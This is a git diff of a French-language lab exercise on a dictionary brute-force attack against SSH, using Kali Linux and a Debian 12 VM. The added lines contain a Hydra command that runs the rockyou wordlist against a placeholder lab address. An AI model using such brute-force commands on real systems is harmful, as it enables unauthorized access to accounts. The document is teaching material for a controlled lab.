@@ -4,7 +4,7 @@
 
 Support : 
 
-* VM Kalilinux avec utilisation deHydra
+* VM Kalilinux avec utilisation de **Hydra**
 * VM Debian 12
 
 ### Mise en situation :
@@ -27,7 +27,10 @@ Ici nous allons utiliser une variante de l'attaque brute force, **attaque par di
 
 ## Méthode
 
-*
+Lancer Hydra sous Kalilinux
+
+hydra -l idpatron -p /usr/share/wordlists/rockyou.txt -u -e s ssh://192.168.56.XX
+
 
 > [!NOTE]
 > Si le mot de passe n'est pas découvert vous pouver utiliser d'autres dictionnaires, allez voir Liste_dictionnaire.md
